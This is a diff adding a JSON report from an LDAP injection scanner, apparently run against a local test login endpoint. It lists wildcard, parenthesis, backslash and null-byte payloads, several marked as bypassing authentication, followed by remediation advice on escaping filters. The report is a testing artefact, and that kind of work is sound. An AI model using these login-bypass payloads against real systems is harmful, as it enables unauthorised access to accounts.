@@ -1,0 +1,113 @@
+{
+  "tool": "LDAPProbe",
+  "generated_at": "2026-11-25T18:26:33.076475+00:00",
+  "target_url": "http://127.0.0.1:8899/login",
+  "parameter": "username",
+  "method": "GET",
+  "overall_verdict": "vulnerable",
+  "results": [
+    {
+      "payload_id": "wildcard-basic",
+      "category": "wildcard",
+      "payload_value": "*",
+      "verdict": "vulnerable",
+      "evidence": [
+        "response length changed: baseline 44 -> 55 bytes",
+        "login-success marker appeared: 'welcome'"
+      ],
+      "error_pattern": null
+    },
+    {
+      "payload_id": "wildcard-login-bypass",
+      "category": "wildcard",
+      "payload_value": "*)(uid=*",
+      "verdict": "vulnerable",
+      "evidence": [
+        "response length changed: baseline 44 -> 55 bytes",
+        "login-success marker appeared: 'welcome'"
+      ],
+      "error_pattern": null
+    },
+    {
+      "payload_id": "paren-close",
+      "category": "parentheses",
+      "payload_value": ")",
+      "verdict": "clean",
+      "evidence": [],
+      "error_pattern": null
+    },
+    {
+      "payload_id": "paren-or-injection",
+      "category": "parentheses",
+      "payload_value": "*)(|(password=*",
+      "verdict": "vulnerable",
+      "evidence": [
+        "response length changed: baseline 44 -> 55 bytes",
+        "login-success marker appeared: 'welcome'"
+      ],
+      "error_pattern": null
+    },
+    {
+      "payload_id": "paren-admin-bypass",
+      "category": "parentheses",
+      "payload_value": "admin)(&)",
+      "verdict": "vulnerable",
+      "evidence": [
+        "response length changed: baseline 44 -> 55 bytes",
+        "login-success marker appeared: 'welcome'"
+      ],
+      "error_pattern": null
+    },
+    {
+      "payload_id": "backslash-bare",
+      "category": "backslash",
+      "payload_value": "\\",
+      "verdict": "clean",
+      "evidence": [],
+      "error_pattern": null
+    },
+    {
+      "payload_id": "backslash-hex-paren",
+      "category": "backslash",
+      "payload_value": "\\28",
+      "verdict": "possibly vulnerable",
+      "evidence": [
+        "status changed: baseline 200 -> 500"
+      ],
+      "error_pattern": "ldapexception"
+    },
+    {
+      "payload_id": "nullbyte-basic",
+      "category": "nullbyte",
+      "payload_value": "\u0000",
+      "verdict": "possibly vulnerable",
+      "evidence": [
+        "status changed: baseline 200 -> 500"
+      ],
+      "error_pattern": "ldapexception"
+    },
+    {
+      "payload_id": "nullbyte-combined",
+      "category": "nullbyte",
+      "payload_value": "*\u0000",
+      "verdict": "vulnerable",
+      "evidence": [
+        "response length changed: baseline 44 -> 55 bytes",
+        "login-success marker appeared: 'welcome'"
+      ],
+      "error_pattern": null
+    },
+    {
+      "payload_id": "combined-full-bypass",
+      "category": "combined",
+      "payload_value": "*)(&(objectClass=*",
+      "verdict": "vulnerable",
+      "evidence": [
+        "response length changed: baseline 44 -> 55 bytes",
+        "login-success marker appeared: 'welcome'"
+      ],
+      "error_pattern": null
+    }
+  ],
+  "remediation_note": "Escape LDAP filter metacharacters in all user-supplied input before building a filter string: '(', ')', '*', '\\', and the null byte each need their own escape sequence (see RFC 4515) -- or better, use a library/binding that builds filters from parts instead of string concatenation. Never trust a login or search parameter as safe just because it came from a form your own app renders."
+}
